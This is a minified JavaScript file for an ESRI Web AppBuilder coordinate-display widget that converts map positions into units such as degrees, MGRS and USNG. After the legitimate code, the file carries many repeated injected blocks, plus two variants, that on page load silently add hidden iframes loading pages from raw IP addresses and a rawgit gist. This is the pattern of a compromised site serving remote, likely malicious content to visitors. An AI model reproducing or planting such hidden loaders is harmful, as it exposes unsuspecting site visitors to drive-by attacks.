// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Coordinate/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Coordinate/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"coordinateBackground"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"coordinateMenuContainer" style\x3d"display:none"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"coordinateMenu"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"coordinateInfoMenu" class\x3d"coordinate-info-menu jimu-float-leading jimu-align-leading"\x3e\r\n      \x3cdiv class\x3d"jimu-float-leading coordinate-locate-container" data-dojo-attach-point\x3d"locateContainer"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"locateButton" class\x3d"coordinate-locate jimu-float-leading"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"coordinateInfo" class\x3d"coordinate-info jimu-float-leading jimu-align-leading"\x3e\r\n        ${nls.loading}\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-float-trailing coordinate-foldable-container" data-dojo-attach-point\x3d"foldContainer"\x3e\r\n      \x3cdiv class\x3d"coordinate-foldable jimu-float-trailing" data-dojo-attach-point\x3d"foldableNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Coordinate/css/style.css":".jimu-widget-coordinate .coordinate-background{line-height: 17px; overflow: hidden; font-size: 10px; color: #fff; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.5);}.jimu-widget-coordinate .display-coordinate-menu{display: block !important; border-bottom: 1px solid rgba(255,255,255,0.4);}.jimu-widget-coordinate .coordinate-locate{width: 17px; height: 17px; background: url(images/locate.png) center no-repeat;}.jimu-widget-coordinate .coordinate-locate-container{width: 17px; height: 17px; border-right: 1px solid rgba(255,255,255,0.4);}.jimu-widget-coordinate .coordinate-locate-container:hover .coordinate-locate{background: url(images/locate-hover.png) center no-repeat !important; cursor: pointer;}.jimu-widget-coordinate .coordinate-locate-container-active .coordinate-locate{background: url(images/locate-active.png) center no-repeat !important; cursor: pointer;}.jimu-widget-coordinate .coordinate-info{margin: 0 5px; font-size: 11px !important; color: #fff !important;}.jimu-widget-coordinate .coordinate-info-menu-empty .coordinate-info{margin: 0;}.jimu-widget-coordinate .coordinate-info-menu-empty .coordinate-locate-container {border-style: none !important;}.jimu-widget-coordinate .coordinate-foldable-container {border-left: 1px solid rgba(255,255,255,0.4); height: 17px;}.jimu-widget-coordinate .coordinate-foldable{background: url(images/more.png) center no-repeat; cursor: pointer; width: 17px; height: 15px; margin: 1px 0;}.jimu-widget-coordinate:hover .coordinate-foldable{background-image: url(images/more-hover.png);}.jimu-rtl .jimu-widget-coordinate .coordinate-locate-container{border-right-style: none; border-left: 1px solid rgba(255,255,255,0.4);}.jimu-rtl .jimu-widget-coordinate .coordinate-locate-container:hover .coordinate-locate,.jimu-rtl .jimu-widget-coordinate .coordinate-locate-container-active .coordinate-locate{background-position: right center;}.jimu-rtl .jimu-widget-coordinate .coordinate-foldable-container{border-left-style: none; border-right: 1px solid rgba(255,255,255,0.4);}.claro .jimu-widget-coordinate .dijitMenuTable {background: transparent; border-style: none;}.claro .jimu-widget-coordinate .dijitMenuItem {color: #fff;}.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItem td{border-style: none; text-align: left; padding: 4px 2px;}.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItem.selected-item{font-weight: bold; background: #000;}.jimu-rtl .claro .jimu-widget-coordinate .dijitMenu .dijitMenuItem td{text-align: right;}.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItemHover td,.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItemHover {color: #fff; background: #000; border-style: none;}.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItemActive,.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItemActive td,.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItemSelected,.claro .jimu-widget-coordinate .dijitMenu .dijitMenuItemSelected td{background: #000; color: #fff;}",
"*now":function(m){m(['dojo/i18n!*preload*widgets/Coordinate/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/html dijit/_WidgetsInTemplateMixin esri/geometry/Point esri/SpatialReference jimu/BaseWidget jimu/utils jimu/dijit/Message dojo/_base/lang dojo/on dojo/dom-class dijit/DropDownMenu dijit/MenuItem dojo/aspect dojo/Deferred esri/request esri/graphic esri/layers/GraphicsLayer esri/tasks/ProjectParameters esri/geometry/webMercatorUtils esri/symbols/PictureMarkerSymbol jimu/portalUtils esri/config libs/usng/usng jimu/SpatialReference/unitUtils".split(" "),function(m,
f,u,v,h,w,q,x,g,l,y,z,A,B,n,C,D,E,F,G,H,r,I,t,p){var J={INCHES:"Inches",FOOT:"Foot",FEET:"Foot",YARDS:"Yards",MILES:"Miles",NAUTICAL_MILES:"Nautical_Miles",MILLIMETERS:"Millimeters",CENTIMETERS:"Centimeters",METER:"Meter",METERS:"Meter",KILOMETERS:"Kilometers",DECIMETERS:"Decimeters",DEGREE:"Decimal_Degrees",DECIMAL_DEGREES:"Decimal_Degrees",DEGREES_DECIMAL_MINUTES:"Degrees_Decimal_Minutes",DEGREE_MINUTE_SECONDS:"Degree_Minutes_Seconds",MGRS:"MGRS",USNG:"USNG"},k={esriCentimeters:"CENTIMETERS",esriDecimalDegrees:"DECIMAL_DEGREES",
esriDegreeMinuteSeconds:"DEGREE_MINUTE_SECONDS",esriDecimeters:"DECIMETERS",esriFeet:"FOOT",esriInches:"INCHES",esriKilometers:"KILOMETERS",esriMeters:"METER",esriMiles:"MILES",esriMillimeters:"MILLIMETERS",esriNauticalMiles:"NAUTICAL_MILES",esriPoints:"POINTS",esriUnknownUnits:"UNKNOWN",esriYards:"YARDS"};return m([w,u],{baseClass:"jimu-widget-coordinate",name:"Coordinate",popMenu:null,selectedWkid:null,selectedItem:null,selectedTfWkid:null,forward:!0,enableRealtime:!1,geoServiceUrl:null,_mapWkid:null,
_configured:!1,_markerGraphic:null,moveTopOnActive:!1,postMixInProperties:function(){this.nls.enableClick=this.nls.enableClick||"Click to enable clicking map to get coordinates";this.nls.disableClick=this.nls.disableClick||"Click to disable clicking map to get coordinates"},postCreate:function(){this.inherited(arguments);y.add(this.coordinateBackground,"coordinate-background");this.own(l(this.map,"extent-change",g.hitch(this,this.onExtentChange)));this.own(l(this.map,"mouse-move",g.hitch(this,this.onMouseMove)));
this.own(l(this.map,"click",g.hitch(this,this.onMapClick)));this.own(l(this.locateButton,"click",g.hitch(this,this.onLocateButtonClick)));this.own(l(this.foldContainer,"click",g.hitch(this,this.onFoldContainerClick)));this.graphicsLayer=new E;this.map.addLayer(this.graphicsLayer)},startup:function(){this.inherited(arguments);this.selectedWkid=this._mapWkid=this.map.spatialReference.isWebMercator()?3857:this.map.spatialReference.wkid;this.config.spatialReferences&&1<this.config.spatialReferences.length?
f.setStyle(this.foldableNode,"display","inline-block"):f.setStyle(this.foldableNode,"display","none")},onOpen:function(){this._processData().then(g.hitch(this,function(b){this.domNode&&(this.initPopMenu(b),1>=this.popMenu.getChildren().length&&f.setStyle(this.foldContainer,"display","none"))}),g.hitch(this,function(b){console.error(b)}))},_processMapUnits:function(b){var a=new n;if(b.units)a.resolve(b);else{var c=b.spatialReference||g.exists("tileInfo.spatialReference",b)&&b.tileInfo.spatialReference,
d=b.extent||b.initialExtent||b.fullExtent,e=c&&(c.latestWkid||c.wkid)||d&&d.spatialReference&&d.spatialReference.wkid,f=this;require(["jimu/SpatialReference/srUtils"],function(c){c.loadResource().then(g.hitch(f,function(){var d=c.getCSUnit(e);b.units=d;a.resolve(b)}))})}return a},_processData:function(){var b=new n,a=this.map.itemInfo.itemData.baseMap.baseMapLayers[0];this.config.spatialReferences&&this.config.spatialReferences.length?(this._configured=!0,b.resolve(this.config.spatialReferences)):
r.getUnits(this.appConfig.portalUrl).then(g.hitch(this,function(c){var d=a&&("BingMapsRoad"===a.type||"BingMapsHybrid"===a.type||"BingMapsAerial"===a.type),e=a&&"WebTiledLayer"===a.type,f=a&&"VectorTileLayer"===a.type;"WMS"===a.type?this._getWMSBaseMapInfo().then(g.hitch(this,function(a){this._configured=!1;b.resolve(a)})):a&&a.url?C({url:a.url,handleAs:"json",callbackParamName:"callback",content:{f:"json"}}).then(g.hitch(this,function(a){this._processMapUnits(a).then(g.hitch(this,function(a){var d=
this._getUnconfiguredUnitOptions(a.units,c),e=a.spatialReference,f=a.extent,e={wkid:e&&(e.latestWkid||e.wkid)||f&&f.spatialReference&&f.spatialReference.wkid,label:"",outputUnit:d.outputUnit};e.options={sameSRWithMap:!0,defaultUnit:k[a.units]||a.units,isGeographicUnit:d.isGeographicUnit,isGeographicCS:d.isGeographicCS,isProjectUnit:d.isProjectUnit,isProjectedCS:d.isProjectedCS,unitRate:d.unitRate};this._configured=!1;b.resolve(e)}))}),g.hitch(this,function(a){console.error(a);b.reject(a)})):a&&("OpenStreetMap"===
a.type||d||e||f)?(d=this._getUnconfiguredUnitOptions("esriMeters",c),e={wkid:3857,label:"",outputUnit:d.outputUnit},e.options={sameSRWithMap:!0,defaultUnit:k.esriMeters,isGeographicUnit:d.isGeographicUnit,isGeographicCS:d.isGeographicCS,isProjectUnit:d.isProjectUnit,isProjectedCS:d.isProjectedCS,unitRate:d.unitRate},this._configured=!1,b.resolve(e)):b.reject(Error("no baseMap"))}));return b},_getUnconfiguredUnitOptions:function(b,a){b=k[b]||b;var c="",d=1,e="",f="",g="",h="";p.isProjectUnit(b)?(g=
h=!0,e=f=!1,c="english"===a?k.esriFeet.toUpperCase():k.esriMeters.toUpperCase(),d=p.getUnitRate(b.toUpperCase(),c)):p.isGeographicUnit(b)&&(g=h=!1,e=f=!0,c=b.toUpperCase());this.map.spatialReference.isWebMercator()&&(c=k.esriDecimalDegrees,f=!0,h=!1,d=1);return{outputUnit:c,unitRate:d,isGeographicUnit:f,isGeographicCS:e,isProjectUnit:h,isProjectedCS:g}},initPopMenu:function(b){this.popMenu=new z({},this.coordinateMenu);B.after(this.popMenu,"onItemClick",g.hitch(this,this.onClickMenu),!0);"[object Array]"!==
Object.prototype.toString.call(b)?(this.selectedWkid=parseInt(b.wkid,10),this.addMenuItem("",this.selectedWkid,b.outputUnit,null,null,b.options),this.selectedItem=this.popMenu.getChildren()[0]):(this.selectedWkid=parseInt(b[0].wkid,10),this.selectedTfWkid=b[0].transformationWkid&&parseInt(b[0].transformationWkid,10),this._addAllMenuItems(),this.selectedItem=this.popMenu.getChildren()[0],this.selectedItem.set({label:this.getStatusString(!0,this.selectedItem.params.name,this.selectedItem.params.wkid)}),
f.addClass(this.selectedItem.domNode,"selected-item"));this._adjustCoordinateInfoUI(this.selectedWkid);this.popMenu.startup()},_addAllMenuItems:function(){for(var b=this.config.spatialReferences.length,a=0;a<b;a++)this.addMenuItem(this.config.spatialReferences[a].label,this.config.spatialReferences[a].wkid,this.config.spatialReferences[a].outputUnit,this.config.spatialReferences[a].transformationWkid,this.config.spatialReferences[a].transformForward,this.config.spatialReferences[a].options)},_isWebMercator:function(b){return h.prototype._isWebMercator?
h.prototype._isWebMercator.apply({wkid:parseInt(b,10)},[]):(new h(parseInt(b,10))).isWebMercator()},canShowInClient:function(b){b=4326===this._mapWkid&&this._isWebMercator(b)||this._isWebMercator(this._mapWkid)&&4326===parseInt(b,10);var a=this.selectedItem.get("options");return a&&a.sameSRWithMap||b?!0:!1},onClickMenu:function(b){f.removeClass(this.selectedItem.domNode,"selected-item");this.selectedItem.set({label:this.getStatusString(!1,this.selectedItem.params.name,this.selectedItem.params.wkid)});
this.selectedWkid=parseInt(b.params.wkid,10);this.selectedTfWkid=b.params.tfWkid;this.forward=b.params.forward;b.set({label:this.getStatusString(!0,b.params.name,b.params.wkid)});f.addClass(b.domNode,"selected-item");this.selectedItem=b;this._adjustCoordinateInfoUI(this.selectedWkid);f.removeClass(this.coordinateMenuContainer,"display-coordinate-menu")},_adjustCoordinateInfoUI:function(b){f.removeClass(this.coordinateInfoMenu,"coordinate-info-menu-empty");this.graphicsLayer.remove(this._markerGraphic);
this._markerGraphic=null;this.canShowInClient(b)?(this.enableRealtime=!0,this.coordinateInfo.innerHTML=this.nls.realtimeLabel):(this.enableRealtime=!1,this.coordinateInfo.innerHTML="",f.addClass(this.coordinateInfoMenu,"coordinate-info-menu-empty"));f.setAttr(this.locateButton,"title",this.nls.enableClick);f.removeClass(this.locateContainer,"coordinate-locate-container-active");this.enableWebMapPopup();this.onExtentChange({extent:this.map.extent})},disableWebMapPopup:function(){this.map.setInfoWindowOnClick(!1)},
enableWebMapPopup:function(){this.map.setInfoWindowOnClick(!0)},onLocateButtonClick:function(){if(f.hasClass(this.coordinateMenuContainer,"display-coordinate-menu"))this.onFoldContainerClick();f.removeClass(this.coordinateInfoMenu,"coordinate-info-menu-empty");f.toggleClass(this.locateContainer,"coordinate-locate-container-active");this.graphicsLayer.remove(this._markerGraphic);this._markerGraphic=null;this.canShowInClient(this.selectedWkid)?this.enableRealtime?(this.enableRealtime=!1,this.coordinateInfo.innerHTML=
this.nls.hintMessage,f.setAttr(this.locateButton,"title",this.nls.disableClick),this.disableWebMapPopup()):(this.enableRealtime=!0,this.coordinateInfo.innerHTML=this.nls.realtimeLabel,f.setAttr(this.locateButton,"title",this.nls.enableClick),this.enableWebMapPopup()):f.hasClass(this.locateContainer,"coordinate-locate-container-active")?(this.coordinateInfo.innerHTML=this.nls.hintMessage,this.disableWebMapPopup(),f.setAttr(this.locateButton,"title",this.nls.disableClick)):(this.coordinateInfo.innerHTML=
"",f.addClass(this.coordinateInfoMenu,"coordinate-info-menu-empty"),this.enableWebMapPopup(),f.setAttr(this.locateButton,"title",this.nls.enableClick))},onDeActive:function(){if(f.hasClass(this.locateContainer,"coordinate-locate-container-active"))this.onLocateButtonClick();if(f.hasClass(this.coordinateMenuContainer,"display-coordinate-menu"))this.onFoldContainerClick()},getStatusString:function(b,a,c){var d="",e=this._mapWkid;c=parseInt(c,10);d=b?"\x3cb\x3e"+d+a+"\x3c/b\x3e\x26nbsp;"+this._rtlTheBrackets(c)+
"\x26nbsp;":d+a+"\x26nbsp;\x26nbsp;"+this._rtlTheBrackets(c)+"\x26nbsp;";c===e&&(d+=this.nls.defaultLabel);return d},_rtlTheBrackets:function(b){return window.isRTL?"\x26rlm;("+b+")":"("+b+")"},addMenuItem:function(b,a,c,d,e,f){b={label:this.getStatusString(!1,b,a)||"",name:b||"",wkid:a||"",outputUnit:c||"",tfWkid:d||"",options:f};b.tfWkid&&(b.forward=e);this.popMenu.addChild(new A(b))},_toFormat:function(b){return isNaN(b)?"":q.localizeNumberByFieldInfo(b,{format:{places:this.config.decimalPlaces,
digitSeparator:this.config.addSeparator}})},onProjectComplete:function(b,a){if(this.selectedWkid&&b===this.selectedWkid&&this.domNode){a=a[0];b=a.x;a=a.y;var c=this.selectedItem.get("outputUnit"),d=this.selectedItem.get("options");"MGRS"===c||"USNG"===c?this._displayUsngOrMgrs(c,a,b):d.isGeographicUnit?this._displayDegOrDms(c,a,b):this._displayProject(c,a,b)}},_unitToNls:function(b){var a=J[b.toUpperCase()];return this.nls[a]||this.nls[b]||b},onProjectError:function(b){new x({message:b.message||b.toString()});
this.coordinateInfo.innerHTML=this.nls.hintMessage},onExtentChange:function(b){if(this.selectedItem){var a=f.position(this.domNode),c=f.position(this.map.root);if(!window.isRTL)a.x-c.x+a.w+5>=c.w&&("left"in this.position?f.setStyle(this.domNode,"right","5px"):f.setStyle(this.domNode,"left","5px"));else if(0>=a.x-c.x||a.x-c.x+a.w+5>=c.w)"left"in this.position?f.setStyle(this.domNode,"left","5px"):f.setStyle(this.domNode,"right","5px");window.appInfo.isRunInMobile?(this.graphicsLayer.remove(this._markerGraphic),
this._markerGraphic=null,f.setStyle(this.locateContainer,"display","none"),f.removeClass(this.coordinateMenuContainer,"display-coordinate-menu"),this.canShowInClient(this.selectedWkid)?this._displayOnClient(b.extent.getCenter()):this._projectMapPoint(b.extent.getCenter())):(f.setStyle(this.locateContainer,"display","block"),1<this.popMenu.getChildren().length?f.setStyle(this.foldContainer,"display","block"):f.setStyle(this.foldContainer,"display","none"))}},_getMarkerGraphic:function(b){var a=new H(this.folderUrl+
"css/images/esriGreenPin16x26.png",16,26);a.setOffset(0,12);return new D(b,a)},onMapClick:function(b){window.appInfo.isRunInMobile||this.enableRealtime||!this.selectedItem||(!this.canShowInClient(this.selectedWkid)&&!f.hasClass(this.locateContainer,"coordinate-locate-container-active")||this._markerGraphic||(this._markerGraphic=this._getMarkerGraphic(b.mapPoint),this.graphicsLayer.add(this._markerGraphic)),this.canShowInClient(this.selectedWkid)?(this._markerGraphic.setGeometry(b.mapPoint),this._displayOnClient(b.mapPoint)):
f.hasClass(this.locateContainer,"coordinate-locate-container-active")&&(this._markerGraphic.setGeometry(b.mapPoint),b=new v(b.mapPoint.x,b.mapPoint.y,this.map.spatialReference),this._projectMapPoint(b)))},_projectMapPoint:function(b){var a=new F,c=null,d=this.selectedItem.get("options");a.geometries=[b];d.isProjectedCS?c=d.isProjectUnit?this.selectedWkid:d.spheroidCS:d.isGeographicCS&&(c=this.selectedWkid);this.selectedTfWkid&&(a.transformation=new h(parseInt(this.selectedTfWkid,10)),a.transformForward=
JSON.parse(this.forward));a.outSR=new h(parseInt(c,10));this.coordinateInfo.innerHTML=this.nls.computing;I.defaults.geometryService.project(a,g.hitch(this,this.onProjectComplete,this.selectedWkid),g.hitch(this,this.onProjectError))},_displayOnClient:function(b){var a=this.selectedItem.get("outputUnit"),c=b.x,d=b.y,e=null,f=4326===this._mapWkid&&this._isWebMercator(this.selectedWkid)||this._isWebMercator(this._mapWkid)&&4326===this.selectedWkid,g=this.selectedItem.get("options"),e=b.normalize();g.isGeographicUnit&&
(c=e.getLongitude()||c);g.isGeographicUnit&&(d=e.getLatitude()||d);f?4326===b.spatialReference.wkid&&this._isWebMercator(this.selectedWkid)?"MGRS"===a||"USNG"===a?this._displayUsngOrMgrs(a,e.getLatitude(),e.getLongitude()):g.isGeographicUnit?this._displayDegOrDms(a,d,c):g.isProjectUnit&&(b=G.lngLatToXY(c,d),this._displayProject(a,b[1],b[0])):b.spatialReference.isWebMercator()&&4326===this.selectedWkid&&("MGRS"===a||"USNG"===a?this._displayUsngOrMgrs(a,e.getLatitude(),e.getLongitude()):g.isGeographicUnit&&
this._displayDegOrDms(a,d,c)):g.defaultUnit===a?(this._displayCoordinatesByOrder(this._toFormat(c),this._toFormat(d)),this.coordinateInfo.innerHTML+=" "+this._unitToNls(a)):4326===b.spatialReference.wkid||b.spatialReference.isWebMercator()?"MGRS"===a||"USNG"===a?this._displayUsngOrMgrs(a,e.getLatitude(),e.getLongitude()):g.isGeographicUnit?this._displayDegOrDms(a,d,c):g.isProjectedCS&&this._displayProject(a,d,c):g.isProjectedCS?this._displayProject(a,d,c):g.isGeographicCS&&("MGRS"===a||"USNG"===a?
this._displayUsngOrMgrs(a,d,c):g.isGeographicUnit&&this._displayDegOrDms(a,d,c))},onMouseMove:function(b){window.appInfo.isRunInMobile||this.enableRealtime&&this.selectedItem&&this._displayOnClient(b.mapPoint)},destroy:function(){this._markerGraphic&&this.graphicsLayer.remove(this._markerGraphic);this.graphicsLayer&&this.map.removeLayer(this.graphicsLayer);this.inherited(arguments)},_displayUsngOrMgrs:function(b,a,c){"MGRS"===b?this.coordinateInfo.innerHTML=t.LLtoMGRS(a,c,5):"USNG"===b&&(this.coordinateInfo.innerHTML=
t.LLtoUSNG(a,c,5));isNaN(a)&&isNaN(c)?this.coordinateInfo.innerHTML="":this.coordinateInfo.innerHTML+=" "+this._unitToNls(b)},_displayDegOrDms:function(b,a,c){var d="",e="",d=this.selectedItem.get("options");c*=d.unitRate;a*=d.unitRate;"DEGREE_MINUTE_SECONDS"===b?(d=this.degToDMS(a,"LAT"),e=this.degToDMS(c,"LON"),this._displayCoordinatesByOrder(d,e)):"DEGREES_DECIMAL_MINUTES"===b?(d=this.degToDDM(a),e=this.degToDDM(c),this._displayCoordinatesByOrder(d,e)):(this._displayCoordinatesByOrder(this._toFormat(c),
this._toFormat(a)),isNaN(a)&&isNaN(c)?this.coordinateInfo.innerHTML="":this.coordinateInfo.innerHTML+=" "+this._unitToNls(b))},_displayProject:function(b,a,c){var d=this.selectedItem.get("options");c*=d.unitRate;a*=d.unitRate;this._displayCoordinatesByOrder(this._toFormat(c),this._toFormat(a));isNaN(a)&&isNaN(c)?this.coordinateInfo.innerHTML="":this.coordinateInfo.innerHTML+=" "+this._unitToNls(b)},_displayCoordinatesByOrder:function(b,a){this.coordinateInfo.innerHTML=this.config.displayOrderLonLat?
b+"  "+a:a+"  "+b},onFoldContainerClick:function(){this._configured&&f.toggleClass(this.coordinateMenuContainer,"display-coordinate-menu")},degToDMS:function(b,a){var c=Math.abs(b),d=Math.floor(c),c=c-d,e=Math.floor(60*c),c=Math.floor(3600*(c-e/60));60===c&&(e++,c=0);60===e&&(d++,e=0);return d+"\x26deg;"+(10>e?"0"+e:e)+"\x26prime;"+(10>c?"0"+c:c)+"\x26Prime;"+("LAT"===a?0>b?"S":"N":0>b?"W":"E")},degToDDM:function(b){var a=Math.abs(b);b=Math.floor(a);var a=a-b,c=Math.floor(60*a),a=Math.floor(3600*
(a-c/60));60===a&&(c++,a=0);60===c&&(b++,c=0);c=q.localizeNumberByFieldInfo(c+a/60,{format:{places:this.config.decimalPlaces,digitSeparator:this.config.addSeparator}});return b+"\x26deg;"+c+"\x26prime;"},_getWMSBaseMapInfo:function(){var b=new n;require(["jimu/SpatialReference/srUtils"],g.hitch(this,function(a){a.loadResource().then(g.hitch(this,function(){var c=this.map.spatialReference.wkid;r.getUnits(this.appConfig.portalUrl).then(g.hitch(this,function(d){if(a.isValidWkid(c)){var e={wkid:a.standardizeWkid(c),
label:a.getSRLabel(parseInt(c,10))};a.isProjectedCS(e.wkid)?e.outputUnit="english"===d?"FOOT":"METER":e.outputUnit=e.outputUnit||a.getCSUnit(e.wkid);d={sameSRWithMap:a.isSameSR(e.wkid,this.map.spatialReference.wkid),isGeographicCS:a.isGeographicCS(e.wkid),isGeographicUnit:a.isGeographicUnit(e.outputUnit),isProjectedCS:a.isProjectedCS(e.wkid),isProjectUnit:a.isProjectUnit(e.outputUnit),spheroidCS:a.isProjectedCS(e.wkid)?a.getGeoCSByProj(e.wkid):e.wkid,defaultUnit:a.getCSUnit(e.wkid),unitRate:a.getUnitRate(a.getCSUnit(e.wkid),
e.outputUnit)};this.map.spatialReference.isWebMercator()&&(d.isGeographicUnit=!0,d.isProjectUnit=!1,d.unitRate=1,e.outputUnit="DECIMAL_DEGREES");"DEGREES_DECIMAL_MINUTES"===e.outputUnit&&(d.isGeographicUnit=!0,d.unitRate=1);e.options=d;b.resolve(e)}}),g.hitch(this,function(a){console.error(a);b.reject(a)}))}))}));return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});